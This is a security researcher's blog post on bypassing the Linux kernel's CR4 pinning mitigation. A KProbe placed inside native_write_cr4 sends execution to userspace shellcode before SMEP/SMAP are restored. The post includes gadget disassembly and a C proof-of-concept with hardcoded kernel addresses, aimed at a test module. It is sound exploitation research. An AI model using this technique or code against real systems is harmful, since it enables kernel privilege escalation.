---
layout: single
title:  "Revisiting Two-Shot Kernel Shellcode Execution From Control Flow Hijacking"
date: 2026-02-10
classes: wide
tags:
  - Exploitation
  - Linux
---

One of the inspirations for my work on the [System Register Hijacking](https://www.usenix.org/system/files/usenixsecurity25-miller.pdf) paper was [this blog post](https://projectzero.google/2017/05/exploiting-linux-kernel-via-packet.html) by Project Zero written by Andrey Konovalov.
In the blog post he describes a method of bypassing SMEP/SMAP by using the `native_write_cr4` function of the kernel, which at the time effectively did `mov cr4, rdi; ret;`.
He redirects control flow to `native_write_cr4` once to disable SMEP/SMAP then triggers control flow hijacking a second time to execute userspace shellcode.

Following that blog post a mitigation was introduced into the Linux that is commonly referred to as "CR Pinning".
Essentially, it is a mitigation that modifies the way the `native_write_cr[0,4]` functions are structured to prevent the kind of misuse shown off by the blog post.

Currently the `native_write_cr4` function looks like this:

```c
static const unsigned long cr4_pinned_mask = X86_CR4_SMEP | X86_CR4_SMAP | X86_CR4_UMIP |
					     X86_CR4_FSGSBASE | X86_CR4_CET | X86_CR4_FRED;
static DEFINE_STATIC_KEY_FALSE_RO(cr_pinning);
static unsigned long cr4_pinned_bits __ro_after_init;

...

void __no_profile native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

There is a global which specifies the pinned values of the register `cr4_pinned_bits` and a mask the specifies which bits of the register are affected by the `CR Pinning` mitigation.
if you attempt to hijack control flow to this function, the cr4 register will be overwritten but then the following code will reset the values of the pinned bits according to the `cr4_pinned_bits` global.

While I was working on [System Register Hijacking](https://www.usenix.org/system/files/usenixsecurity25-miller.pdf), we did find a pretty clean gadget for writing cr4 elsewhere in the kernel, in `sev_modify_cbit`:

```
<sev_verify_cbit+69>:	mov    cr4,rsi
<sev_verify_cbit+72>:	je     0xffffffff810003f7 <sev_verify_cbit+87>
<sev_verify_cbit+74>:	xor    rsp,rsp
<sev_verify_cbit+77>:	sub    rsp,0x1000
<sev_verify_cbit+84>:	hlt
<sev_verify_cbit+85>:	jmp    0xffffffff810003f4 <sev_verify_cbit+84>
<sev_verify_cbit+87>:	mov    rax,rdi
<sev_verify_cbit+90>:	jmp    0xffffffff82142cc0 <srso_alias_return_thunk>
```

Assuming the flags register is in the correct state you effectively get a `mov cr4, rsi; mov rax, rdi; ret;` from this function.
Which is pretty good, but the requirement on the flags register for taking the conditional jump kind of sucks, it means there are some callsites it just won't work from unless you get ROP first and modify the flags.

So I started wondering, is there another way of getting around the `CR Pinning` mitigation?

# Mind The Gap

The CR Pinning mitigation is... honestly kind of a strange one.
You are actually able to overwrite cr4 but then it sets it to a fixed up value several instructions later.
Though, I don't think there is a better way to implement the mitigation, if you have a `mov cr4, r..` instruction anywhere in the kernel then architecturally you can't really stop someone from hijacking control flow to it (CFI aside, I suppose).
So doing this fixup after the write occurs is about the best that can be done.

But it is still really interesting to me that there is a "gap" between you overwriting cr4 and it being fixed.
In theory the kernel could even be preempted by a timer interrupt in the middle of that gap and execute other code while using a hijacked cr4 value before continuing to the code that sets the pinned bits.

The preemption case depends on a very tight window though, given how few instructions are in that gap, making it impractical to use.

But what if there was a way to reliably run code in that window?

# KProbing

As it turns out the kernel has an API called [KProbes](https://docs.kernel.org/trace/kprobes.html) that allows a breakpoint instruction to be inserted into kernel code at run time for tracing reasons, and provided handler functions will be called before and after stepping over the breakpoint. This API is privilleged, but assuming we have control flow hijacking though we can just call it directly.

The API is pretty simple, you can register a kprobe via the `register_kprobe` function, which takes one argument `struct kprobe *`.
The kprobe struct has a field for setting the address you want the breakpoint on (alternatively, you can provide a symbol name and an offset), as well as the addresses for the `pre_handler` and `post_handler` callbacks.

If we register a KProbe in the middle of the `native_write_cr4` "gap", we can set the pre or post handler function to a usermode address and control flow will be redirected to userspace before the cr4 value gets fixed up.

# Arguments

Though to call `register_kprobe` we need control over rdi and we need the ability to forge a `struct kprobe` somewhere in kernel memory.

For rdi control there might be some heap allocated function table that gives you control of rdi, but I'm not aware of one. It is pretty common to control rsi though, and after looking for a bit I found there is a function called `devm_action_release` that is effectively a `mov rdi, [rsi]; mov rax, [rsi+0x8]; call rax;` gadget.
So assuming we can put an rdi and rip value somewhere in memory, we can point rsi at it and call this function to obtain rdi control.

Thankfully there are known ways of getting controlled data at known (or inferrable) locations in the kernel.
One of which is to just spray mmap pages, side channel physmap base, and guess an address relative to physmap base where an mmap page might be.
Another option is to use the [NPerm](https://github.com/n132/security-research/blob/6a09081d502e4a95011d63cb2b58fa0b21b3028b/pocs/linux/kernelctf/CVE-2025-38477_cos/docs/novel-techniques.md#leave-payload-next-to-kernel-resource-nperm) technique found by n132, which allows you to get data relative to the kernel image.

# Draw the Rest of the Owl

So given that we can redirect control flow in the middle of `native_write_cr4` (you could also target `sev_verify_cbit`), all thats left is to put it together.
I PoC'd it out with a kernel module, but the same idea could be applied to an actual exploit.

The ioctl command hijacks control flow with two arguments according to the `arb_call_req` struct provided as an argument.
The first argument is set to 0xdeadbeef in both cases because I didn't want to assume rdi control.

The complete PoC can be found [here](/assets/two-shot-shellcode/exploit/exploit.c), but here is the main logic of it:

```c
// used by devm_action_release gadget
struct pc_arg {
    u64 a0;
    u64 pc;
};

struct nperm_payload {
    struct kprobe kp;
    struct pc_arg pa1;
    struct pc_arg pa2;
};

// Control flow returns here
void from_kernel() {
    int uid = getuid();
    char flag[0x20] = {0};
    int flag_fd = open("/flag", O_RDONLY);
    read(flag_fd, flag, sizeof(flag));
    write(1, flag, sizeof(flag));

    while (1) {}
}

int main(int argc, char **argv) {
    struct arb_call_req req;
    u64 kaslr_base = 0xffffffff81000000;
    u32 dbg = open("/proc/dbg-mod", 2);

    sandbox();
    save_state();

    // address of some controlled data placed by nperm.
    u64 nperm_addr_guess = 0xffffffff84c11000;

    struct nperm_payload payload = {
        .kp = {
            .addr = (void *)0xffffffff8107220e, // in the middle of `native_write_cr4`
            .pre_handler = escalate_privs, // userspace shellcode
            .post_handler = (void *)0xdeadbeefcafeb0ba,
        },
        .pa1 = {
            .pc = 0xffffffff812542d0, // register_kprobe
            .a0 = nperm_addr_guess,
        },
        .pa2 = {
            .pc = 0xffffffff81072200, // native_write_cr4
            .a0 = 0x450ef0, // PKE OSXSAVE FSGSBASE UMIP OSXMMEXCPT OSFXSR PGE MCE PAE PSE
        },
    };

    nperm(&payload, sizeof(payload));

    // gadget to get control of rdi
    u64 devm_action_release = 0xffffffff81b24770;

    req.pc = devm_action_release;
    req.a0 = 0xdeadbeef;
    req.a1 = nperm_addr_guess + offsetof(struct nperm_payload, pa1);
    ioctl(dbg, 1337, &req);

    req.pc = devm_action_release;
    req.a0 = 0xdeadbeef;
    req.a1 = nperm_addr_guess + offsetof(struct nperm_payload, pa2);
    ioctl(dbg, 1337, &req);

    // Control flow continues in from_kernel()

    return 0;
}
```

# Conclusion

I think getting shellcode execution is one of those things in both kernel and userspace that is fun to achieve just because being able to run arbitrary code very completely "owns" the system/program.
This technique manages to achieve shellcode execution in the same number of 'control flow hijacks' as the old 2017 blog post while going through the same function, and I think that's neat.

In theory there are other places this KProbe idea could be applied to, any series of instructions can become a gadget by placing a KProbe immediately after it and using the callbacks to chain it to another code location.
Unfortunately, the KProbe callback functions run with the original register state stored in `pt_regs` limiting the effectiveness of chaining multiple kprobes together as a kind of KProbe Oriented Programming (KPOP?).
It could still be possible to use percpu variables or other non-register means to store the results of computations, so don't give up on KPOP yet :p

This was kind of just a silly idea I wanted to explore, but I learned a lot about KProbes and got to use NPerm for the first time.
Anyways, thanks for reading, I hope you learned something from this too!
